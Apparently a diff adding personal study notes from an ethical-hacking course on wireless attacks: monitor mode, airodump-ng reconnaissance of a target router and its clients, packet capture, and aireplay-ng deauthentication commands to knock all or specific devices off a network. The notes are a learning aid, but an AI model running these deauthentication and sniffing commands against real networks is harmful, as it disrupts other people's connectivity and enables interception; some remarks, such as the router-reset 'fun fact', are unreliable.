@@ -1,0 +1,99 @@
+
+NOTE !!!
+********
+
+TUTOR USES HIS OWN ROUTER OR OWN NETWORK OR HIS COMPANY ROUTER SO THAT I HE CAN PRACTICE WITHOUT ANY MISCONCEPTIONS :)
+
+----------------------------------------------------------------------------
+
+49. Network Sniffing :
+***
+
+1. $ ifconfig (check eth0 , l0 , wlan0)
+
+2. COMMANDS:
+
+	$ airmon-ng start wlan0  ( Goes monitor mode like wlan0 --> wlan0mon )
+	$ ifconfig and iwconfig(you can see the interface name)
+	$ airodump-ng wlan0mon (or) airodump-ng [interface name]
+	# You can see BSSID PWR
+	# BSSID stands for MAC address of the router or network
+	# PWR stands for proximity to target range ( greater negative pwr closer to target)
+	# Beacons and data - (transformation or announcement packets that our router is sending right now)
+	# Channel (CH) - Example : If I go t my Internet provider and I say hey My internet is slower and they change me to the less traffic channels.
+	# Encryption (ENC) - Usually WPA2 ( we have to overcome the encryption and find the password)
+	# ESSID - Name of the Network that we are going to attack
+
+	# But those infos are not pretty much enough
+
+	# So I have to also know how many devices are connected to my target or Target ID or target router
+
+	# But dont forget to save all these infos you have gathered
+
+----------------------------------------------------------------------------
+50. Airodump Specific Target:
+***
+
+ Network Reconiassance
+
+ NOTE!!! : Author chooses a target named Academy Club which is his same router 
+ 
+1. Take the BSSID( MAC address of the network ) of the target which we have gathered earlier
+
+2. $ airodump-ng --channel 8 --bssid 94:FE:22:DA:AC:30 --write airodump_result wlan0mon
+
+3. --channel is CH , --bssid is BSSID , --write is to write the result in a file , wlan0mon is our own interface
+( It can be in the format of .cap , .csv , .netxml , .log.csv , .history )
+( .cap can be viewed using wireshark )
+
+4. Now we have found the Stations along with the BSSID of the same mac address with different STATION names
+
+__________________________________
+5. $ sudo apt install wireshark
+__________________________________
+
+6. WireShark is a network analyzer , it starts to capture the packets. It starts to listen to the traffic , It shows the list of interfaces
+
+7. If I select any interface , the packets transmit but all those packets are encrypted with WPA or WPA2 encryption !!!
+
+8. Also the packet's data contain gibberish words that are not readable because of that encryption
+
+---------------------------------------------------------------------------
+
+51. Deauthentication Attack :
+
+NOTE !!! : Make sure you are in the monitor mode 
+
+1. $ airodump-ng --channel 8 --bssid 94:FE:22:DA:AC:30 wlan0mon
+   ( View this network )
+
+2. $ aireplay-ng --deauth 10000 -a 94:FE:22:DA:AC:30 wlanmon
+
+   # --deauth is  Deauthentication module
+   # 10000 is number of packets we want to deauthenticate and that much amount of packets wont be received by the target. So they will lose internet connection for sometime (i.e) for 10000 packets :)
+   # -a is to write the access point, the router's MAC address ( 94:FE:22:DA:AC:30 )
+   # wlanmon is the name of the interface right now and just acially attackagainst all the stations / devices that is being connected to this network right now
+
+   # But it is not effective to launch a DDos attack the whole network
+
+3. $ aireplay-ng --deauth 10000 -a 94:FE:22:DA:AC:30 -c [ STATION - MAC ] wlanmon
+   # To attack the specific client
+   # But unfortunately in " $ airodump-ng --channel 8 --bssid 94:FE:22:DA:AC:30 wlan0mon " we were not able to find the specific user of the selected STATION MAC
+
+   ____________________________________________________________________
+
+                              FUN FACT :
+			      
+   If all these go correct , if you mention the packets as
+   10000 or one lakh or more than that , router reset itsef by shutdown
+   or restarting itself and blocks you for a while
+
+   But after two to five minutes you'll be able to do that again
+
+   Becoz, There is no real way to stop a hacker doing this :)
+
+   
+
+   
+   
+   
